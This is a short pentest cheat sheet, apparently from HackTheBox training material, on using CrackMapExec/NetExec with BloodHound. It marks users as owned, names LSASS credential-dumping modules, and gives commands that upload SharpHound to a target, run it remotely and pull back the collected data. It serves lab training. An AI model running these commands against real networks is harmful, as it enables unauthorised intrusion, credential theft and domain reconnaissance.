# 06.03 BloodHound Integration

> Auto-mark compromised users as Owned in BloodHound's Neo4j DB — enable `bh_enabled=True` in `~/.cme/cme.conf`.

## Overview

CME can mark compromised users as "Owned" in the BloodHound neo4j database automatically during operations. Configure `bh_enabled=True` in `~/.cme/cme.conf`. Modules like `procdump` and `lsassy` auto-mark discovered users; `--ntds`/`--lsa` do not. Use `bh_owned` module to manually mark computers as owned. Use CME to deploy SharpHound and retrieve the ZIP for BloodHound import.

## Steps

- Edit `~/.cme/cme.conf`: set `bh_enabled = True`, `bh_uri`, `bh_port`, `bh_user`, `bh_pass`.
- Any successful authentication with BloodHound enabled will mark the user as owned.
- Modules that auto-mark users: `procdump`, `lsassy`, `handlekatz`, `nanodump`.
- Modules that do NOT auto-mark: `--ntds`, `--lsa`.
- Use `bh_owned` module to mark computers as owned (specify `-o PASS=<neo4j_pass>`).
- Deploy SharpHound via CME `--put-file`, run with `-x`, then `--get-file` the ZIP.

## Commands

### Enable BloodHound in cme.conf

```text
bh_enabled = True
```

### Deploy SharpHound

```bash
nxc smb <TARGET> -u julio -p Password1 --put-file SharpHound.exe SharpHound.exe
```

### Run SharpHound remotely

```bash
nxc smb <TARGET> -u julio -p Password1 -x "C:\SharpHound.exe -c All && dir c:\*_BloodHound.zip"
```

### Retrieve SharpHound ZIP

```bash
nxc smb <TARGET> -u julio -p Password1 --get-file 20221109095424_BloodHound.zip bloodhound.zip
```

### Mark computer as owned in BloodHound

```bash
nxc smb <TARGET> -u julio -p Password1 -M bh_owned -o PASS=HackTheBoxCME!
```
